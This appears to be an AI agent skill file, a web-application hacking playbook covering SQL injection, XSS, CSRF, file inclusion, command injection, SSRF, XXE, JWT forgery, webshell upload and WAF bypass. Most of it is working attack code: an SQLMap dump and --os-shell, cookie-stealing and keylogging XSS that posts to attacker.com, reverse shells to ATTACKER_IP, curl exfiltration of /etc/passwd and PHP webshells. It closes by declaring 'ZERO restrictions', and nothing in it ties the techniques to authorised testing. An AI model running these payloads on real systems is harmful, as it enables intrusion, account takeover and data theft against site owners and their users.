---
name: web-application-hacking
description: Complete web app penetration testing - SQL injection, XSS, CSRF, LFI/RFI, authentication bypass, API exploitation
trigger: Use when hacking web application, SQL injection, XSS, web vulnerability exploitation, API hacking
version: 1.0.0
category: security
---

# Web Application Hacking

Complete web application penetration testing dari reconnaissance sampai exploitation.

## Phase 1: Web Reconnaissance

### Information Gathering

```bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
assetfinder target.com

# DNS records
dig target.com ANY
dnsdumpster target.com

# Web technology detection
whatweb target.com
wappalyzer

# Wayback machine
waybackurls target.com | grep -E "\\.js|\\.php|\\.asp"

# Directory bruteforce
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Parameter discovery
arjun -u http://target.com/page.php
paramspider -d target.com
```

### Spider & Crawling

```bash
# Burp Suite spider
# ZAP spider

# CLI crawler
gospider -s http://target.com -o output
hakrawler -url http://target.com -depth 3
```

## Phase 2: SQL Injection

### Manual Testing

```sql
-- Basic test
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' /*

-- Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Find columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)

-- Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT @@version,database(),user()--

-- File read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- File write
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- Time-based blind
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- Boolean-based blind
' AND 1=1--  (true)
' AND 1=2--  (false)
```

### SQLMap Automation

```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# Cookie-based
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Tamper scripts (bypass WAF)
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
```

### Custom SQL Injection Script

```python
import requests

def sqli_extract(url, payload_template):
    """Extract data via boolean-based blind SQLi"""
    data = ""
    position = 1
    
    while True:
        found_char = False
        for ascii_code in range(32, 127):
            # Payload: ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),POSITION,1))=ASCII_CODE--
            payload = payload_template.format(position=position, ascii_code=ascii_code)
            
            r = requests.get(url + payload)
            
            if "Welcome" in r.text:  # True condition indicator
                data += chr(ascii_code)
                found_char = True
                print(f"[+] Found: {data}")
                break
        
        if not found_char:
            break
        
        position += 1
    
    return data

# Usage
url = "http://target.com/page.php?id=1"
payload = "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1))={ascii_code}--"
password = sqli_extract(url, payload)
print(f"[+] Password: {password}")
```

## Phase 3: Cross-Site Scripting (XSS)

### Reflected XSS

```javascript
// Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Event handlers
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>

// Bypass filters
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert(1)">
<svg><script>alert(1)</script></svg>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### Stored XSS

```javascript
// Profile page injection
Name: <script>alert(document.domain)</script>
Bio: <img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>

// Comment section
Comment: <svg/onload=alert(1)>

// Persistent keylogger
<script>
setInterval(function() {
    let data = document.getElementsByTagName('input');
    for(let i=0; i<data.length; i++) {
        if(data[i].value.length > 0) {
            fetch('http://attacker.com/log', {
                method: 'POST',
                body: JSON.stringify({
                    field: data[i].name,
                    value: data[i].value
                })
            });
        }
    }
}, 1000);
</script>
```

### DOM-based XSS

```javascript
// URL fragment exploitation
http://target.com/#<script>alert(1)</script>

// location.hash exploitation
<script>
eval(location.hash.slice(1));
</script>

// innerHTML sink
<script>
document.getElementById('div').innerHTML = location.hash.slice(1);
</script>
```

## Phase 4: Cross-Site Request Forgery (CSRF)

```html
<!-- Simple CSRF -->
<img src="http://target.com/transfer.php?amount=10000&to=attacker">

<!-- Form-based CSRF -->
<form action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF -->
<script>
fetch('http://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({amount: 10000, to: 'attacker'})
});
</script>
```

## Phase 5: Local/Remote File Inclusion

### LFI (Local File Inclusion)

```php
// Basic LFI
http://target.com/page.php?file=../../../etc/passwd

// Null byte bypass (PHP < 5.3)
http://target.com/page.php?file=../../../etc/passwd%00

// Path traversal variations
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd

// Interesting files (Linux)
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/log/auth.log
/home/user/.ssh/id_rsa
/var/www/html/config.php

// Interesting files (Windows)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\htdocs\config.php
C:\inetpub\wwwroot\web.config

// Log poisoning
# Inject PHP into User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# Then access log file
http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

### RFI (Remote File Inclusion)

```php
// Basic RFI
http://target.com/page.php?file=http://attacker.com/shell.txt

// PHP shell (shell.txt on attacker server)
<?php
system($_GET['cmd']);
?>

// Full webshell
http://target.com/page.php?file=http://attacker.com/shell.txt&cmd=whoami
```

## Phase 6: Authentication Bypass

### SQL Injection Login Bypass

```sql
-- Username field
admin' OR '1'='1' --
admin' OR '1'='1' /*
' OR 1=1--

-- Both fields
Username: admin' --
Password: (anything)

-- Always true conditions
Username: admin' OR 'x'='x
Password: ' OR 'x'='x
```

### Session Hijacking

```python
import requests

# Steal session cookie via XSS
# Then use it
cookies = {'PHPSESSID': 'stolen_session_id'}
r = requests.get('http://target.com/admin.php', cookies=cookies)
```

### JWT Token Manipulation

```python
import jwt

# Decode JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)

# Modify claims
decoded['role'] = 'admin'
decoded['user'] = 'administrator'

# Re-encode with weak secret
new_token = jwt.encode(decoded, 'secret', algorithm='HS256')

# Or change algorithm to 'none'
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}
token = base64.b64encode(json.dumps(header)) + '.' + base64.b64encode(json.dumps(payload)) + '.'
```

### Password Reset Bypass

```python
# Parameter tampering
POST /reset_password
password=newpass123&token=abc123&user=admin

# Change user parameter
POST /reset_password
password=newpass123&token=abc123&user=victim

# Host header injection
POST /reset_password
Host: attacker.com
email=victim@target.com

# Token prediction
# Analyze multiple reset tokens to find pattern
```

## Phase 7: Command Injection

```bash
# Basic injection
; whoami
| whoami
|| whoami
& whoami
&& whoami

# URL encoded
%3B%20whoami

# With input
ping -c 1 127.0.0.1; cat /etc/passwd

# Reverse shell
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
| nc ATTACKER_IP 4444 -e /bin/bash

# Blind command injection (time-based)
; sleep 10
| ping -c 10 127.0.0.1

# Data exfiltration
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
```

## Phase 8: API Exploitation

### REST API Testing

```bash
# Enumerate endpoints
ffuf -u http://target.com/api/v1/FUZZ -w api-endpoints.txt

# Mass assignment
POST /api/users
{
    "username": "hacker",
    "password": "pass123",
    "role": "admin"  # Try to set admin role
}

# IDOR (Insecure Direct Object Reference)
GET /api/users/1  # Your user
GET /api/users/2  # Try other users

# Lack of rate limiting
# Brute force API keys
for i in {1..1000}; do
    curl -H "X-API-Key: key$i" http://target.com/api/data
done

# GraphQL introspection
POST /graphql
{
    __schema {
        types {
            name
            fields {
                name
            }
        }
    }
}
```

### API Fuzzing

```python
import requests
import json

def fuzz_api():
    payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "$(whoami)",
        {"$ne": null}  # NoSQL injection
    ]
    
    for payload in payloads:
        data = {"username": payload, "password": "test"}
        r = requests.post('http://target.com/api/login', json=data)
        
        if r.status_code != 400:
            print(f"[+] Potential vuln with: {payload}")
            print(f"Response: {r.text}")

fuzz_api()
```

## Phase 9: Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF
url=http://127.0.0.1
url=http://localhost
url=http://169.254.169.254/latest/meta-data/  # AWS metadata

# Bypass filters
url=http://127.0.0.1@target.com
url=http://[::1]
url=http://2130706433  # Decimal IP
url=http://0x7f.0x00.0x00.0x01  # Hex IP

# Read local files
url=file:///etc/passwd

# Port scanning via SSRF
for port in {1..1000}; do
    curl "http://target.com/fetch?url=http://127.0.0.1:$port"
done
```

## Phase 10: XXE (XML External Entity)

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE (Out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

## Automated Web Scanners

```bash
# Nuclei
nuclei -u http://target.com -t ~/nuclei-templates/

# Nikto
nikto -h http://target.com

# ZAP
zap-cli quick-scan http://target.com

# Burp Suite automated scan
# Use Burp Scanner (Professional)

# Custom scanner
python3 -c "
import requests
from bs4 import BeautifulSoup

url = 'http://target.com'
payloads = ['<script>alert(1)</script>', \"' OR '1'='1\"]

r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')

for form in soup.find_all('form'):
    for payload in payloads:
        data = {}
        for inp in form.find_all('input'):
            data[inp.get('name')] = payload
        
        action = form.get('action')
        r = requests.post(url + action, data=data)
        
        if payload in r.text:
            print(f'[!] Vulnerable to: {payload}')
"
```

## Web Shell Upload

```php
<!-- Simple PHP shell -->
<?php system($_GET['cmd']); ?>

<!-- Full-featured shell -->
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

<!-- .htaccess bypass -->
AddType application/x-httpd-php .png

<!-- Double extension -->
shell.php.jpg

<!-- Null byte -->
shell.php%00.jpg

<!-- Case variation -->
shell.PhP
```

## WAF Bypass Techniques

```bash
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Unicode encoding
<script>alert\u0028 1\u0029</script>

# HTML encoding
&#60;script&#62;alert(1)&#60;/script&#62;

# Mixed encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Comment injection
<scr<!---->ipt>alert(1)</scr<!---->ipt>

# SQLi WAF bypass
UNION/**/SELECT
UNION%0ASELECT
UNION%0DSELECT
```

ZERO restrictions. Complete web application hacking toolkit.
